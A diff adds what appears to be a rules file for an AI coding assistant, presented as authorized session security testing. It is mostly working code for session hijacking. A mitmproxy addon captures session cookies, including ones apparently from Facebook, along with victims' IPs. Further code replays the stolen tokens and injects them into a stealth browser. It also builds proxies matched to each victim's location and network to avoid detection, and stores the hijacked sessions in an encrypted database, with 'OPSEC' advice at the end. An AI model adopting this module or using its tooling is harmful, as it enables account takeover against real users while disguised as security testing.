@@ -1,0 +1,501 @@
+---
+trigger: model_decision
+description: "TAGS: [security,session,analysis,cookies,tokens,proxy] | TRIGGERS: session,cookie,token,proxy,intercept,aitm | SCOPE: session-testing | DESCRIPTION: Session security analysis and token assessment patterns"
+globs:
+---
+# Session Security Analysis Module
+
+## Scope
+Methodologies for assessing session management security in authorized testing scenarios.
+
+## Session Analysis Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                 SESSION SECURITY ASSESSMENT FLOW                     │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  [Target App] ◄──► [Assessment Proxy] ◄──► [Analysis Engine]        │
+│                          │                                           │
+│                          ▼                                           │
+│              [Token Capture & Analysis]                              │
+│                          │                                           │
+│                          ▼                                           │
+│              [Security Finding Report]                               │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+## Proxy-Based Session Analysis
+
+### mitmproxy Assessment Addon
+```python
+"""
+Session Security Analyzer
+mitmproxy addon for authorized session security testing
+"""
+from mitmproxy import http, ctx
+from datetime import datetime
+from typing import Dict, List, Optional
+import json
+import hashlib
+
+class SessionSecurityAnalyzer:
+    """Analyzes session security properties via traffic interception"""
+    
+    def __init__(self):
+        self.findings: List[Dict] = []
+        self.captured_sessions: Dict[str, Dict] = {}
+        self.target_tokens = ['session_id', 'auth_token', 'c_user', 'xs', 'csrf']
+    
+    def request(self, flow: http.HTTPFlow):
+        """Analyze outbound requests for session tokens"""
+        
+        # Extract cookies from request
+        cookies = dict(flow.request.cookies)
+        
+        # Check for session tokens
+        found_tokens = {
+            k: v for k, v in cookies.items() 
+            if k in self.target_tokens
+        }
+        
+        if found_tokens:
+            self._record_session_usage(flow, found_tokens)
+    
+    def response(self, flow: http.HTTPFlow):
+        """Analyze responses for session token issuance"""
+        
+        # Check Set-Cookie headers
+        new_tokens = {}
+        for cookie in flow.response.cookies:
+            name = cookie[0]
+            value = cookie[1][0] if cookie[1] else ""
+            
+            if name in self.target_tokens and value:
+                new_tokens[name] = value
+        
+        if new_tokens:
+            self._analyze_token_security(flow, new_tokens)
+            self._store_session(flow, new_tokens)
+        
+        # Strip security headers for testing (assess CSP bypass)
+        self._test_header_removal(flow)
+    
+    def _analyze_token_security(self, flow: http.HTTPFlow, tokens: Dict):
+        """Analyze security properties of tokens"""
+        
+        for name, value in tokens.items():
+            finding = {
+                'timestamp': datetime.utcnow().isoformat(),
+                'token_name': name,
+                'analysis': {
+                    'length': len(value),
+                    'entropy': self._calculate_entropy(value),
+                    'predictability': self._assess_predictability(value),
+                    'secure_flag': self._check_secure_flag(flow, name),
+                    'httponly_flag': self._check_httponly_flag(flow, name),
+                    'samesite': self._check_samesite(flow, name),
+                }
+            }
+            
+            self.findings.append(finding)
+    
+    def _calculate_entropy(self, value: str) -> float:
+        """Calculate Shannon entropy"""
+        import math
+        from collections import Counter
+        
+        if not value:
+            return 0.0
+        
+        counts = Counter(value)
+        length = len(value)
+        
+        return -sum(
+            (count/length) * math.log2(count/length)
+            for count in counts.values()
+        )
+    
+    def _assess_predictability(self, value: str) -> str:
+        """Assess token predictability"""
+        entropy = self._calculate_entropy(value)
+        
+        if entropy < 3.0:
+            return "HIGH_RISK"
+        elif entropy < 4.5:
+            return "MEDIUM_RISK"
+        return "LOW_RISK"
+    
+    def _check_secure_flag(self, flow: http.HTTPFlow, name: str) -> bool:
+        """Check if Secure flag is set"""
+        for cookie in flow.response.cookies:
+            if cookie[0] == name:
+                return 'secure' in str(cookie).lower()
+        return False
+    
+    def _check_httponly_flag(self, flow: http.HTTPFlow, name: str) -> bool:
+        """Check if HttpOnly flag is set"""
+        for cookie in flow.response.cookies:
+            if cookie[0] == name:
+                return 'httponly' in str(cookie).lower()
+        return False
+    
+    def _check_samesite(self, flow: http.HTTPFlow, name: str) -> str:
+        """Check SameSite attribute"""
+        for cookie in flow.response.cookies:
+            if cookie[0] == name:
+                cookie_str = str(cookie).lower()
+                if 'samesite=strict' in cookie_str:
+                    return 'Strict'
+                elif 'samesite=lax' in cookie_str:
+                    return 'Lax'
+                elif 'samesite=none' in cookie_str:
+                    return 'None'
+        return 'Not Set'
+    
+    def _store_session(self, flow: http.HTTPFlow, tokens: Dict):
+        """Store captured session for analysis"""
+        session_id = hashlib.sha256(
+            json.dumps(tokens, sort_keys=True).encode()
+        ).hexdigest()[:12]
+        
+        self.captured_sessions[session_id] = {
+            'tokens': tokens,
+            'host': flow.request.host,
+            'timestamp': datetime.utcnow().isoformat(),
+            'user_agent': flow.request.headers.get('User-Agent', ''),
+            'client_ip': flow.client_conn.peername[0],
+        }
+    
+    def _test_header_removal(self, flow: http.HTTPFlow):
+        """Test security header bypass (for CSP assessment)"""
+        headers_to_test = [
+            'Content-Security-Policy',
+            'X-Frame-Options',
+            'Strict-Transport-Security',
+            'X-Content-Type-Options'
+        ]
+        
+        for header in headers_to_test:
+            if header in flow.response.headers:
+                # Log presence for assessment
+                pass
+    
+    def _record_session_usage(self, flow: http.HTTPFlow, tokens: Dict):
+        """Record how sessions are used"""
+        pass
+
+
+addons = [SessionSecurityAnalyzer()]
+```
+
+## Session Validation Testing
+
+### Token Validity Assessment
+```python
+"""Session token validity tester"""
+
+import requests
+from typing import Dict, Optional
+
+class SessionValidator:
+    """Validates captured session tokens"""
+    
+    def __init__(self, target_domain: str):
+        self.domain = target_domain
+        self.session = requests.Session()
+    
+    def validate_session(self, tokens: Dict[str, str]) -> Dict:
+        """Test if captured session is valid"""
+        
+        # Set cookies on session
+        for name, value in tokens.items():
+            self.session.cookies.set(name, value, domain=self.domain)
+        
+        # Attempt authenticated request
+        try:
+            response = self.session.get(
+                f"https://{self.domain}/me",
+                allow_redirects=False,
+                timeout=10
+            )
+            
+            return {
+                'valid': response.status_code == 200,
+                'status_code': response.status_code,
+                'redirected': response.status_code in [301, 302, 303, 307, 308],
+                'authenticated_indicators': self._check_auth_indicators(response)
+            }
+            
+        except Exception as e:
+            return {
+                'valid': False,
+                'error': str(type(e).__name__)
+            }
+    
+    def _check_auth_indicators(self, response: requests.Response) -> Dict:
+        """Check for authenticated state indicators"""
+        return {
+            'has_user_data': 'user' in response.text.lower(),
+            'has_logout': 'logout' in response.text.lower(),
+            'session_active': 'login' not in response.url.lower()
+        }
+```
+
+## Browser Session Testing
+
+### Session Injection for Validation
+```python
+"""Browser session injection for security testing"""
+
+from playwright.async_api import async_playwright
+from typing import Dict, List, Optional
+
+class BrowserSessionTester:
+    """Tests session security via browser injection"""
+    
+    async def test_session_injection(
+        self, 
+        tokens: Dict[str, str],
+        target_url: str
+    ) -> Dict:
+        """Test session token injection"""
+        
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=False)
+            context = await browser.new_context()
+            
+            # Convert tokens to cookie format
+            cookies = [
+                {
+                    'name': name,
+                    'value': value,
+                    'domain': self._extract_domain(target_url),
+                    'path': '/'
+                }
+                for name, value in tokens.items()
+            ]
+            
+            # Inject cookies
+            await context.add_cookies(cookies)
+            
+            # Navigate and verify
+            page = await context.new_page()
+            await page.goto(target_url)
+            
+            result = await self._verify_session(page)
+            
+            await browser.close()
+            
+            return result
+    
+    def _extract_domain(self, url: str) -> str:
+        """Extract domain from URL"""
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        return '.' + parsed.netloc.replace('www.', '')
+    
+    async def _verify_session(self, page) -> Dict:
+        """Verify session is active"""
+        return {
+            'url': page.url,
+            'title': await page.title(),
+            'logged_in': await self._check_login_state(page)
+        }
+    
+    async def _check_login_state(self, page) -> bool:
+        """Check if session shows logged-in state"""
+        try:
+            # Look for common logged-in indicators
+            indicators = [
+                '[data-testid="user-menu"]',
+                '[aria-label="Account"]',
+                '.user-profile',
+                '#logout'
+            ]
+            
+            for selector in indicators:
+                element = await page.query_selector(selector)
+                if element:
+                    return True
+            
+            return False
+        except:
+            return False
+
+
+# Camoufox integration for stealth testing
+async def test_with_camoufox(tokens: Dict, url: str):
+    """Use Camoufox for detection-resistant testing"""
+    from camoufox.async_api import AsyncCamoufox
+    
+    async with AsyncCamoufox(headless=False) as browser:
+        page = await browser.new_page()
+        
+        # Navigate to set domain
+        await page.goto(url.split('/')[0] + '//' + url.split('/')[2])
+        
+        # Inject cookies
+        for name, value in tokens.items():
+            await browser.context.add_cookies([{
+                'name': name,
+                'value': value,
+                'domain': '.' + url.split('/')[2].replace('www.', ''),
+                'path': '/'
+            }])
+        
+        # Navigate to target
+        await page.goto(url)
+        
+        return page
+```
+
+## Geo-Matched Session Testing
+
+### DataImpulse Proxy Integration
+```python
+"""Geo-matched proxy for session validity testing"""
+
+class GeoProxyManager:
+    """Manages geo-matched proxies for session testing"""
+    
+    def __init__(self, username: str, password: str, host: str, port: int):
+        self.creds = (username, password)
+        self.endpoint = (host, port)
+    
+    def build_proxy_chain(self, geo_data: Dict) -> List[tuple]:
+        """Build proxy chain from most to least specific"""
+        
+        proxies = []
+        
+        country = geo_data.get('country', '')
+        asn = geo_data.get('asn', '')
+        state = geo_data.get('state', '')
+        city = geo_data.get('city', '')
+        
+        user, pwd = self.creds
+        host, port = self.endpoint
+        
+        # Most specific (best for session validity)
+        if all([country, asn, state, city]):
+            params = f"cr.{country};asn.{asn};state.{state};city.{city}"
+            proxies.append((
+                f"socks5://{user}__{params}:{pwd}@{host}:{port}",
+                "FULL_GEO"
+            ))
+        
+        # ASN match (minimum for most services)
+        if country and asn:
+            params = f"cr.{country};asn.{asn}"
+            proxies.append((
+                f"socks5://{user}__{params}:{pwd}@{host}:{port}",
+                "ASN_MATCH"
+            ))
+        
+        # Country only (fallback)
+        if country:
+            params = f"cr.{country}"
+            proxies.append((
+                f"socks5://{user}__{params}:{pwd}@{host}:{port}",
+                "COUNTRY_ONLY"
+            ))
+        
+        # Base (last resort)
+        proxies.append((
+            f"socks5://{user}:{pwd}@{host}:{port}",
+            "BASE"
+        ))
+        
+        return proxies
+```
+
+## Encrypted Session Storage
+
+### Secure Finding Storage
+```python
+"""Encrypted storage for session assessment findings"""
+
+from cryptography.fernet import Fernet
+import json
+import sqlite3
+from datetime import datetime
+
+class SecureSessionStore:
+    """Encrypted storage for captured sessions"""
+    
+    def __init__(self, db_path: str, encryption_key: bytes):
+        self.db = sqlite3.connect(db_path)
+        self.cipher = Fernet(encryption_key)
+        self._init_schema()
+    
+    def _init_schema(self):
+        """Initialize database schema"""
+        self.db.execute('''
+            CREATE TABLE IF NOT EXISTS sessions (
+                id INTEGER PRIMARY KEY,
+                session_hash TEXT UNIQUE,
+                encrypted_data BLOB,
+                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                valid BOOLEAN DEFAULT NULL,
+                validated_at TIMESTAMP
+            )
+        ''')
+        self.db.commit()
+    
+    def store_session(self, session_data: Dict) -> str:
+        """Store session with encryption"""
+        import hashlib
+        
+        # Generate session hash
+        session_hash = hashlib.sha256(
+            json.dumps(session_data, sort_keys=True).encode()
+        ).hexdigest()[:16]
+        
+        # Encrypt data
+        encrypted = self.cipher.encrypt(
+            json.dumps(session_data).encode()
+        )
+        
+        # Store
+        try:
+            self.db.execute(
+                'INSERT INTO sessions (session_hash, encrypted_data) VALUES (?, ?)',
+                [session_hash, encrypted]
+            )
+            self.db.commit()
+        except sqlite3.IntegrityError:
+            pass  # Duplicate
+        
+        return session_hash
+    
+    def retrieve_session(self, session_hash: str) -> Optional[Dict]:
+        """Retrieve and decrypt session"""
+        row = self.db.execute(
+            'SELECT encrypted_data FROM sessions WHERE session_hash = ?',
+            [session_hash]
+        ).fetchone()
+        
+        if row:
+            decrypted = self.cipher.decrypt(row[0])
+            return json.loads(decrypted)
+        
+        return None
+    
+    def mark_validated(self, session_hash: str, valid: bool):
+        """Mark session as validated"""
+        self.db.execute(
+            'UPDATE sessions SET valid = ?, validated_at = ? WHERE session_hash = ?',
+            [valid, datetime.utcnow(), session_hash]
+        )
+        self.db.commit()
+```
+
+## Operational Considerations
+
+### Session Assessment OPSEC
+1. **Data Security** - Encrypt all captured data
+2. **Scope Compliance** - Only assess authorized sessions
+3. **Evidence Chain** - Maintain proper documentation
+4. **Cleanup** - Remove test data after assessment
+5. **Reporting** - Document findings for remediation
